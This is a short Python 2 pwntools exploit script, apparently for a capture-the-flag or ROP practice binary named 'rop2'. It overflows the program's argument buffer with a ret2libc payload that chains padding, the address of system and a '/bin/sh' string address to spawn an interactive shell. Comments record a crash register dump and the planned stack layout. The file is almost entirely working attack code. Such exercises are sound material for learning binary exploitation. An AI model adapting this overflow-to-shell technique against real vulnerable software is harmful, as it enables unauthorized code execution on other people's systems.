#!/usr/bin/env python2

from pwn import *

context(os = 'linux', arch = 'i386', terminal = 'xterm')
binary = 'rop2'

debug = False
crash = False

if 'DEBUG' in args:
    debug = True
    context.log_level = 0

if 'CRASH' in args:
    crash = True
    debug = True

elf = ELF(binary)

#EAX: 0xffd5c2cc ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa\034\303\325\377")
#EBX: 0x0 
#ECX: 0xffd5cc00 ("yaab")
#EDX: 0xffd5c390 ("yaab")
#ESI: 0x2 
#EDI: 0xf77b1000 --> 0x1b4d90 
#EBP: 0x62616163 ('caab')
#ESP: 0xffd5c340 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
#EIP: 0x62616164 ('daab')

log.info('system found at ' + format(elf.symbols['system'], '02x'))
log.info('/bin/sh found at ' + format(elf.symbols['not_used'], '02x')) # Wrong!

# Stack
# | 0x8048570  <'/bin/sh'>           |
# | 0x43434343 <fake return address> |
# | 0x8048340  <address of system>   |
# | 0x42424242 <fake old %ebp>       |
# | 0x41414141 ...                   |
# |   ... (0x6c bytes of 'A's)       |
# |   ... 0x41414141                 |
#

payload =  "A"*(cyclic_find(0x62616163))
payload += "BBBB"          # fake ret address
payload += p32(elf.symbols['system']) 
payload += "CCCC"          # fake ret address
payload += p32(0x8048570) # 0x8048570

if crash:
    payload = cyclic(200)

if debug:
    r = gdb.debug([binary, payload])
    pause()
    sys.exit(0)
else:
    r = process(binary + " " + payload, shell=True)

r.clean()
r.interactive()

